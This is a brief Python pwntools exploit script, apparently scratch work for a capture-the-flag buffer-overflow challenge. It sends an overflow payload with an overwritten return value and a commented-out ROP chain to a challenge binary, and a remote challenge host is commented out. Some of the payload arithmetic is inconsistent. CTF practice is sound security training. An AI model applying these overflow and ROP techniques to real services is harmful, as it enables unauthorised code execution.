from pwn import *

p = process("./soal_3")
# p = remote("103.185.44.235", 11101)

elf = ELF("./soal")
context.log_level = "DEBUG"

rop = ROP(elf)
# rop.call("cheat", [0x52504153, 0xDEADBEEF])
# print(rop.dump())
payload = b"12345678910"


# p.recvuntil(b"laptop ? ")
# p.sendline(payload)

# payload = flat({56: rop.chain()})
# p.interactive()
# process 103.185.44.235:11201
p.recvuntil(b"Work or leave ? ")
offset = 56

payload = offset * b"328"
payload += p64((0x74382920382323))
# payload += rop.chain()


p.sendline(payload)
# p.recvline()
p.interactive()
# raw_input("wait")

# aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaaa3271284658380061132712846583800611
